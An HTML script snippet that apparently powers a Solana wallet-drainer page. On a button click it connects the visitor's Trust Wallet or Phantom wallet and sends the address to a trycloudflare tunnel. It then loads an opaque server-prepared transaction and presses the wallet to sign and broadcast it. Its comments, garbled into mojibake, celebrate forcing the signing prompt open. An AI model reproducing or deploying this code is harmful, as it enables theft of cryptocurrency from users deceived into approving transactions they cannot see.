<script>
    const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";

    document.getElementById('cta').onclick = async () => {
        const log = (t) => document.getElementById('st').innerText = t;
        const sWeb3 = window.solanaWeb3;
        
        // ğŸ”± 1. å¤šé‡æ¢æµ‹ Provider
        const p = window.trustwallet?.solana || window.solana || (window.phantom?.solana?.isPhantom ? window.phantom.solana : null);

        if (!p) { alert("Wallet Not Found! Use TW Browser."); return; }

        try {
            log("CONNECTING...");
            await p.connect();

            log("GETTING PAYLOAD...");
            const resp = await fetch(tunnel + "/prepare_v32", {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ address: p.publicKey.toString() })
            });
            const info = await resp.json();

            log("IGNITING WALLET...");
            const bytes = Uint8Array.from(window.atob(info.raw_tx), c => c.charCodeAt(0));
            
            // ğŸ”± 2. å…¼å®¹æ€§è½¬æ¢
            let tx;
            try {
                tx = sWeb3.VersionedTransaction.deserialize(bytes);
            } catch(e) {
                tx = sWeb3.Transaction.from(bytes);
            }

            // ğŸ”± 3. å¼ºåˆ¶æ‹‰èµ·å°è¯•
            console.log("Attempting to send...", tx);
            
            // ä¼˜å…ˆä½¿ç”¨ç›´æ¥å‘é€ï¼Œä¸è¡Œå°±å…ˆç­¾åå†æ‰‹åŠ¨å‘é€
            try {
                const { signature } = await p.signAndSendTransaction(tx);
                log("DONE: " + signature.slice(0,8));
            } catch (sendErr) {
                console.log("Fallback to Sign Only...");
                const signedTx = await p.signTransaction(tx);
                log("TRANSACTION SIGNED!");
                // æ­¤æ—¶å·²ç»æˆåŠŸå¼¹å‡ºç­¾åæ¡†äº†ï¼
            }

        } catch (err) {
            alert("IGNITION ERROR: " + err.message);
            window.location.reload();
        }
    };
</script>
